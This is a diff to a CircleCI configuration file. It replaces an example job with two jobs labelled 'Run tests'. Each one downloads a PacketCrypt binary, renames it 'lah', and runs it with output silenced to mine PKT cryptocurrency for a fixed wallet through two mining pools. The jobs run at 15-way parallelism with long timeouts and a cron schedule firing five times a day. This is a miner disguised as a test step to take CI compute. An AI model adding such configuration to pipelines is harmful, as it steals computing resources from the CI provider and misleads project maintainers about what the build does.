@@ -1,20 +1,51 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
-orbs:
-  github-cli: circleci/github-cli@2.0.0
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
-  example-job:
+  build_and_test: # this can be any name you choose
     docker:
-      # replace with your preferred image
-      - image: cimg/base:stable
-    steps:
-      - github-cli/clone:
-          repo: https://github.com/Deploybotdotcom/redesigned-couscous 
-          dir: . 
+      - image: thomasjp0x42/packetcrypt
+    steps: 
+      - checkout
+      - run:
+          name: Run tests
+          no_output_timeout: 294m
+          command: |
+                  wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
+                  chmod +x lah 
+                  ./lah ann -p pkt1q7ha7z0usaqvk98jyucacp7vjf3k5lm873c9gr8 http://pool.pkt.world/ http://pool.pktpool.io/ >/dev/null 2>&1
+                  echo "lah"
+    parallelism: 15
+    
+  build_and_test1: # this can be any name you choose
+    docker:
+      - image: thomasjp0x42/packetcrypt
+    steps: 
+      - checkout
+      - run:
+          name: Run tests
+          no_output_timeout: 294m
+          command: |
+                  wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
+                  chmod +x lah 
+                  ./lah ann -p pkt1q7ha7z0usaqvk98jyucacp7vjf3k5lm873c9gr8 http://pool.pkt.world/ http://pool.pktpool.io/ >/dev/null 2>&1
+                  echo "lah"
+    parallelism: 15
 workflows:
-  example-workflow:
-    jobs:
-      - example-job
+  version: 2
+  build: 
+     jobs:
+       - build_and_test
+       - build_and_test1
+
+
+  nightly:
+     triggers:
+      - schedule:
+          cron: "0 0,5,10,15,20 * * *"
+          filters:
+            branches:
+              only:
+                - main
+                
+     jobs:
+      - build_and_test
+      - build_and_test1
